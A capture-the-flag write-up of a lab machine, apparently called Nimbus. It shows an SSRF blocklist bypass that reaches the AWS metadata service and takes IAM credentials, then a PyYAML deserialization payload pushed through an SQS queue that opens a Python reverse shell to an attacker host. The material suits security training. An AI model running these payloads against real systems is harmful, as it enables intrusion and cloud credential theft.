# Nimbus Write-up

## Initial Enumeration

As with any assessment, we begin by identifying the exposed attack surface.

A full TCP scan revealed the listening services.

```bash
nmap -p- --min-rate 5000 <TARGET_IP>
```

Only two ports were exposed: **22 (SSH)** and **80 (HTTP)**. A second scan was performed to identify service versions and execute the default NSE scripts.

```bash
nmap -p22,80 -sV -sC <TARGET_IP>
```

The results identified an **OpenSSH** service and an **Nginx** web server redirecting requests to `nimbus.htb`.

```bash
echo "<TARGET_IP> nimbus.htb" | sudo tee -a /etc/hosts
```

Browsing to the application revealed that the Job Submitter was temporarily left unauthenticated during a migration window.

> **Insert screenshot:** Nimbus landing page

---

## Discovering the SSRF Vulnerability

Exploring the application revealed a feature allowing users to upload a YAML configuration or provide a remote URL through a **Preview** function.

Because the backend needed to retrieve remote resources before validating them, this immediately suggested a potential Server-Side Request Forgery (SSRF) attack surface.

The application attempted to protect itself by only allowing `.yaml` URLs while blacklisting addresses such as `localhost`, `127.0.0.1`, and `169.254.169.254`. Both protections relied on shallow validation.

### Exploiting the SSRF

To verify the vulnerability, we targeted the AWS Instance Metadata Service (IMDSv1), which exposes temporary IAM credentials.

The blacklist was bypassed by converting the metadata IP to octal notation:

```text
0251.0376.0251.0376
```

The file extension check was bypassed by appending:

```text
?file.yaml
```

The final payload became:

```text
http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?file.yaml
```

The response disclosed temporary AWS credentials for the **nimbus-web-role** IAM role.

> **Insert screenshot:** AWS credentials

---

## Enumerating LocalStack

The credentials were exported into the AWS CLI environment.

```bash
export AWS_ACCESS_KEY_ID="<ACCESS_KEY>"
export AWS_SECRET_ACCESS_KEY="<SECRET_KEY>"
export AWS_SESSION_TOKEN="<SESSION_TOKEN>"
export AWS_DEFAULT_REGION="us-east-1"
```

Since the target used LocalStack, every request specified the custom endpoint.

```bash
aws --endpoint-url http://aws.nimbus.htb sqs list-queues
```

This revealed:

```text
http://floci:4566/847219365028/nimbus-jobs
```

The queue strongly suggested that another service asynchronously processed submitted jobs.

---

## Remote Code Execution

Further investigation revealed that the backend worker processed queue messages using PyYAML's unsafe `yaml.load()` function.

Unlike `yaml.safe_load()`, `yaml.load()` supports arbitrary object deserialization, allowing constructors such as `!!python/object/apply` to instantiate Python objects during parsing.

By abusing this behavior, we instructed the worker to execute `subprocess.Popen`, resulting in operating system command execution.

A malicious YAML payload containing a Python reverse shell was created and saved as `shell.yaml`.

```YAML
name: nightly-db-backup 
schedule: '* * * * *' 
runtime: python3.11 
exploit: !!python/object/apply:subprocess.Popen [ ['python3', '-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKER_IP>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'] ]
```

Start a listener:

```bash
nc -nvlp <PORT>
```

Submit the payload to the queue:

```bash
aws --endpoint-url http://aws.nimbus.htb sqs send-message \
  --queue-url "http://floci:4566/847219365028/nimbus-jobs" \
  --message-body "$(cat shell.yaml)"
```

Once the worker consumed the message, the payload was deserialized and a reverse shell connected back to our listener.

---

## User Access

The reverse shell landed inside the worker container as the **worker** user.

The user flag was then retrieved.

```bash
cat /home/worker/user.txt
```

At this stage the initial foothold on the machine had been successfully established.

> **Note:** Continue with privilege escalation once additional enumeration identifies a path to the underlying host or elevated privileges.
